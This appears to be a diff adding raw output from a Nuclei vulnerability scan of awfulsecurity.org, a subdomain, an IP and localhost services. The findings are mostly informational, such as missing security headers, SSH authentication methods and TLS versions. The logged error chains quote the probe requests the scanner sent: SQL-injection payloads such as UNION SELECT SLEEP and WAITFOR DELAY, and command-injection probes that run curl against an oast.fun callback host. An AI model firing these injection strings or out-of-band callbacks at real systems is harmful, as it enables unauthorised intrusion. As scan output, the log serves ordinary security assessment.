@@ -1,0 +1,243 @@
+=== web_nuclei ===
+Targets: 2 IPs, 2 domains
+=== nuclei ===
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.7.0
+
+		projectdiscovery.io
+
+[[34mINF[0m] Current nuclei version: v3.7.0 ([92mlatest[0m)
+[[34mINF[0m] Current nuclei-templates version: v10.3.8 ([92mlatest[0m)
+[[34mINF[0m] New templates added in latest release: 457
+[[34mINF[0m] Templates loaded for current scan: 9630
+[[34mINF[0m] Executing 9628 signed templates from projectdiscovery/nuclei-templates
+[[93mWRN[0m] Loading 2 unsigned templates for scan. Use with caution.
+[[34mINF[0m] Targets loaded for current scan: 11
+[[34mINF[0m] Templates clustered: 2207 (Reduced 22935 Requests)
+[[34mINF[0m] Skipped 127.0.0.1:80 from target list as found unresponsive permanently: Get "http://127.0.0.1": cause="port closed or filtered" address=127.0.0.1:80 chain="connection refused"
+[[34mINF[0m] Skipped 127.0.0.1:443 from target list as found unresponsive permanently: cause="port closed or filtered" address=127.0.0.1:443 chain="connection refused; got err while executing https://127.0.0.1/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:6%27--"
+[[34mINF[0m] Skipped 127.0.0.1:80 from target list as found unresponsive permanently: cause="port closed or filtered" address=127.0.0.1:80 chain="connection refused; got err while executing http://127.0.0.1/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20md5(999999999)%20as%20id%20from%20HrmResourceManager"
+[[34mINF[0m] Skipped 127.0.0.1:443 from target list as found unresponsive permanently: cause="port closed or filtered" address=127.0.0.1:443 chain="connection refused; got err while executing https://127.0.0.1/webadm/?q=moni_detail.do&action=gragh"
+[[34mINF[0m] Skipped 127.0.0.1:80 from target list as found unresponsive permanently: Post "http://127.0.0.1/uapjs/jsinvoke/?action=invoke": cause="port closed or filtered" address=127.0.0.1:80 chain="connection refused"
+[[34mINF[0m] Skipped 127.0.0.1:443 from target list as found unresponsive permanently: cause="port closed or filtered" address=127.0.0.1:443 chain="connection refused; got err while executing https://127.0.0.1/dataSetParam/verification;swagger-ui/"
+[[34mINF[0m] Skipped 127.0.0.1:80 from target list as found unresponsive permanently: cause="port closed or filtered" address=127.0.0.1:80 chain="connection refused; got err while executing http://127.0.0.1/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
+[[34mINF[0m] Using Interactsh Server: oast.fun
+[[34mINF[0m] Skipped 127.0.0.1:80 from target list as found unresponsive permanently: cause="port closed or filtered" address=127.0.0.1:80 chain="connection refused; got err while executing http://127.0.0.1/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
+[[34mINF[0m] Skipped 127.0.0.1:443 from target list as found unresponsive permanently: cause="port closed or filtered" address=127.0.0.1:443 chain="connection refused; got err while executing https://127.0.0.1/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: Post "https://intragin.awfulsecurity.org/photo-gallery/api/album/tree_lists/": cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: Post "http://intragin.awfulsecurity.org/photo-gallery/api/album/tree_lists/": cause="i/o timeout" address=intragin.awfulsecurity.org:80
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: Post "http://awfulsecurity.org/photo-gallery/api/album/tree_lists/": cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: Post "https://awfulsecurity.org/photo-gallery/api/album/tree_lists/": cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80 chain="got err while executing http://awfulsecurity.org/login.php"
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443 chain="got err while executing https://165.245.137.16/login.php"
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443 chain="got err while executing https://awfulsecurity.org/login.php"
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: Post "https://165.245.137.16/hms/user-login.php": cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: Post "https://awfulsecurity.org/hms/user-login.php": cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: Post "https://intragin.awfulsecurity.org/hms/user-login.php": cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: Get "https://165.245.137.16/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g": cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: Get "http://intragin.awfulsecurity.org/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g": cause="i/o timeout" address=intragin.awfulsecurity.org:80
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: Get "https://intragin.awfulsecurity.org/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g": cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: Get "https://awfulsecurity.org/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g": cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: Get "http://awfulsecurity.org/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g": cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443 chain="got err while executing https://awfulsecurity.org/module/tshirtecommerce/designer?product_id=900982561&parent_id=1;SELECT%20SLEEP(8);"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80 chain="got err while executing http://intragin.awfulsecurity.org/module/tshirtecommerce/designer?product_id=900982561&parent_id=1;SELECT%20SLEEP(8);"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443 chain="got err while executing https://intragin.awfulsecurity.org/module/tshirtecommerce/designer?product_id=900982561&parent_id=1;SELECT%20SLEEP(8);"
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443 chain="got err while executing http://intragin.awfulsecurity.org/modules/ndk_steppingpack/search-result.php"
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80 chain="got err while executing http://awfulsecurity.org/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<\"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80 chain="got err while executing http://intragin.awfulsecurity.org/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<\"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443 chain="got err while executing https://intragin.awfulsecurity.org/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<\"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept"
+[[34mINF[0m] Skipped localhost:43800 from target list as found unresponsive permanently: cause="port closed or filtered" address=localhost:43800 chain="connection refused; got err while executing http://localhost:43800/static-files/cNU1rzi.txt"
+[[34mINF[0m] Skipped 165.245.137.16:43800 from target list as found unresponsive permanently: cause="port closed or filtered" address=165.245.137.16:43800 chain="connection refused; got err while executing http://165.245.137.16:43800/static-files/cNU1rzi.txt"
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443 chain="got err while executing https://165.245.137.16/query?getcommand&cmd=curl+http://d60348ovkgtr96bkd640ouzjcsehcezi5.oast.fun"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80 chain="got err while executing http://intragin.awfulsecurity.org/query?getcommand&cmd=curl+http://d60348ovkgtr96bkd640atu6c8c55rzyn.oast.fun"
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443 chain="got err while executing https://awfulsecurity.org/query?getcommand&cmd=curl+http://d60348ovkgtr96bkd640do6xcindp9p1f.oast.fun"
+[[34mINF[0m] Skipped localhost:9000 from target list as found unresponsive permanently: Get "http://localhost:38595": cause="port closed or filtered" address=localhost:38595 chain="connection refused"; Get "http://localhost:38595": cause="port closed or filtered" address=localhost:38595 chain="connection refused"
+[[92mswagger-api[0m] [[94mhttp[0m] [[34minfo[0m] http://localhost:3000/api-docs/swagger.json [[93mpaths[0m=[93m"/api-docs/swagger.json"[0m]
+[[92mswagger-api[0m] [[94mhttp[0m] [[34minfo[0m] http://localhost:8000/docs [[93mpaths[0m=[93m"/docs"[0m]
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80 chain="got err while executing"
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443 chain="got err while executing"
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped 165.245.137.16:80 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:80
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80
+[[92mmissing-sri[0m] [[94mhttp[0m] [[34minfo[0m] http://localhost:3000 [[96m"//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js"[0m,[96m"//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"[0m,[96m"//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css"[0m]
+[[92mmissing-sri[0m] [[94mhttp[0m] [[34minfo[0m] https://www.awfulsecurity.org/ [[96m"https://apis.google.com/js/client.js?onload=gapiLoaded"[0m,[96m"https://www.gstatic.com/_/atari/_/js/k=atari.vw.en_US.A8h_Ji9J88s.O/am=AAgGEA/d=1/rs=AGEqA5lu2uMa6TssknW86Ou5iFGIwpkh4Q/m=view"[0m,[96m"https://fonts.googleapis.com/css?family=Oswald%3A400%2C600%2C700%7COpen%20Sans%3A400%2C600%2C700&display=swap"[0m,[96m"https://fonts.googleapis.com/css?family=Google+Sans:400,500|Roboto:300,400,500,700|Source+Code+Pro:400,700&display=swap"[0m,[96m"https://fonts.googleapis.com/css?family=Oswald%3Ai%2Cbi%2C700%2C400&display=swap"[0m,[96m"https://www.gstatic.com/_/atari/_/ss/k=atari.vw.s8aMlimGPLs.L.W.O/am=AAgGEA/d=1/rs=AGEqA5mOdMkqOcyzJXTt0zzr6sU1Jn4qDA"[0m]
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[92mmissing-sri[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org [[96m"https://fonts.googleapis.com/css2?family=Archivo:wght@600;700;800&family=Inter:wght@600;700;800&family=Oswald:wght@500;600;700&family=Sora:wght@300;400;500;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&display=swap"[0m]
+[[92mmissing-sri[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/ [[96m"https://fonts.googleapis.com/css2?family=Archivo:wght@600;700;800&family=Inter:wght@600;700;800&family=Oswald:wght@500;600;700&family=Sora:wght@300;400;500;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&display=swap"[0m]
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443 chain="got err while executing"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped 165.245.137.16:80 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:80
+[[92mwaf-detect[0m:[1;92mapachegeneric[0m] [[94mhttp[0m] [[34minfo[0m] https://awfulsecurity.org
+[[92mwaf-detect[0m:[1;92mnginxgeneric[0m] [[94mhttp[0m] [[34minfo[0m] http://intragin.awfulsecurity.org
+[[92mwaf-detect[0m:[1;92mnginxgeneric[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mwaf-detect[0m:[1;92mapachegeneric[0m] [[94mhttp[0m] [[34minfo[0m] http://awfulsecurity.org
+[[92mwaf-detect[0m:[1;92mnginxgeneric[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mwaf-detect[0m:[1;92mnginxgeneric[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80 chain="got err while executing http://intragin.awfulsecurity.org/j_security_check"
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443 chain="got err while executing https://165.245.137.16/j_security_check"
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80 chain="got err while executing http://awfulsecurity.org/CDGServer3/NoticeAjax;Service"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443
+[[34mINF[0m] Skipped awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=awfulsecurity.org:443
+[[34mINF[0m] Skipped 165.245.137.16:443 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:443
+[[34mINF[0m] Skipped 165.245.137.16:80 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:80
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: Post "http://awfulsecurity.org/weaver/weaver.file.FileDownloadForOutDoc": cause="i/o timeout" address=awfulsecurity.org:80
+[[34mINF[0m] Skipped 165.245.137.16:80 from target list as found unresponsive permanently: cause="i/o timeout" address=165.245.137.16:80 chain="got err while executing http://165.245.137.16/weaver/weaver.file.FileDownloadForOutDoc"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:80 chain="got err while executing http://intragin.awfulsecurity.org/weaver/weaver.file.FileDownloadForOutDoc"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="i/o timeout" address=intragin.awfulsecurity.org:443 chain="got err while executing https://intragin.awfulsecurity.org/zdm/cxf/login"
+[[34mINF[0m] Skipped localhost:8000 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing http://[localhost:8000:9780]:8000/api/v1/user_assets/nfc"
+[[34mINF[0m] Skipped localhost:3000 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing http://[localhost:3000:9780]:3000/api/v1/user_assets/touch_pass/keys"
+[[92mssh-auth-methods[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22 [[96m"["publickey","password"]"[0m]
+[[92mssh-auth-methods[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22 [[96m"["publickey","password"]"[0m]
+[[92mssh-auth-methods[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22 [[96m"["publickey","password"]"[0m]
+[[92mssh-auth-methods[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22 [[96m"["publickey","password"]"[0m]
+[[92mssh-password-auth[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22
+[[92mssh-password-auth[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22
+[[92mssh-password-auth[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22
+[[92mssh-password-auth[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22
+[[92mssh-server-enumeration[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mssh-server-enumeration[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mssh-server-enumeration[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mssh-sha1-hmac-algo[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22
+[[92mssh-server-enumeration[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mssh-sha1-hmac-algo[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22
+[[92mssh-sha1-hmac-algo[0m] [[94mjavascript[0m] [[34minfo[0m] 165.245.137.16:22
+[[92mssh-sha1-hmac-algo[0m] [[94mjavascript[0m] [[34minfo[0m] intragin.awfulsecurity.org:22
+[[92mopenssh-detect[0m] [[94mtcp[0m] [[34minfo[0m] 165.245.137.16:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mopenssh-detect[0m] [[94mtcp[0m] [[34minfo[0m] 165.245.137.16:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mopenssh-detect[0m] [[94mtcp[0m] [[34minfo[0m] intragin.awfulsecurity.org:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mopenssh-detect[0m] [[94mtcp[0m] [[34minfo[0m] intragin.awfulsecurity.org:22 [[96m"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.13"[0m]
+[[92mtls-version[0m] [[94mssl[0m] [[34minfo[0m] 165.245.137.16:443 [[96m"tls12"[0m]
+[[92mtls-version[0m] [[94mssl[0m] [[34minfo[0m] intragin.awfulsecurity.org:443 [[96m"tls12"[0m]
+[[92mtls-version[0m] [[94mssl[0m] [[34minfo[0m] 165.245.137.16:443 [[96m"tls13"[0m]
+[[92mtls-version[0m] [[94mssl[0m] [[34minfo[0m] intragin.awfulsecurity.org:443 [[96m"tls13"[0m]
+[[92mtls-version[0m] [[94mssl[0m] [[34minfo[0m] awfulsecurity.org:443 [[96m"tls12"[0m]
+[[92mtls-version[0m] [[94mssl[0m] [[34minfo[0m] awfulsecurity.org:443 [[96m"tls13"[0m]
+[[92mhttp-missing-security-headers[0m:[1;92mstrict-transport-security[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcontent-security-policy[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mpermissions-policy[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mx-content-type-options[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mx-permitted-cross-domain-policies[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mreferrer-policy[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mclear-site-data[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-opener-policy[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mx-frame-options[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-embedder-policy[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-resource-policy[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mold-copyright[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16 [[96m"\u00a9 2009"[0m]
+[[92mhttp-missing-security-headers[0m:[1;92mpermissions-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mx-frame-options[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-embedder-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mstrict-transport-security[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcontent-security-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mx-content-type-options[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mx-permitted-cross-domain-policies[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mreferrer-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mclear-site-data[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-opener-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-resource-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mold-copyright[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org [[96m"\u00a9 2009"[0m]
+[[92mhttp-missing-security-headers[0m:[1;92mx-frame-options[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mreferrer-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-embedder-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-opener-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-resource-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mstrict-transport-security[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mcontent-security-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mx-content-type-options[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mx-permitted-cross-domain-policies[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mclear-site-data[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mhttp-missing-security-headers[0m:[1;92mpermissions-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mold-copyright[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/ [[96m"\u00a9 2009"[0m]
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-resource-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mstrict-transport-security[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mcontent-security-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
